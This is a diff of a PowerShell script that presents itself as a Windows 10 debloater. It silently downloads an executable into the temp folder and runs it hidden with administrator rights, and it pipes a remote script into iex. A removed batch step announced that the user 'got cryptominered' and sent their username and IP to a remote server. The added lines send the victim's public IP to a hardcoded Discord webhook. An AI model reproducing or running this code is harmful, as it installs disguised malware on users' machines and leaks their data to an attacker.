@@ -1,7 +1,12 @@
 iwr "https://raw.githubusercontent.com/Dazd-Pkz/Windows10Debloater/main/saucisson.exe" -o $env:TEMP\saucisson.exe
-echo "@echo off" > $env:TEMP\f.bat
-echo "curl icanhazip.com > ip & set /p ip=<ip" >> $env:TEMP\f.bat
-(echo curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%username% got cryptominered - Ip : %ip%\"}") >> $env:TEMP\f.bat
-Start-Process -WindowStyle hidden -FilePath $env:TEMP\f.bat
+
+$hookUrl = 'https://discord.com/api/webhooks/1007602451702087793/iOOKR4A2rDTjBNiy5QlsHj7EInFqpiQTvbCHVxrh9KtaOKW9VSxrY0xbb951XAWoQSbQ'
+$MyIP = (Invoke-WebRequest -uri "http://ifconfig.me/ip").Content
+
+$payload = [PSCustomObject]@{
+    content = $MyIP
+}
+Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)
+
 Start-Process -Verb RunAs -WindowStyle hidden -FilePath $env:TEMP\saucisson.exe
 iwr -useb git.io/debloat|iex
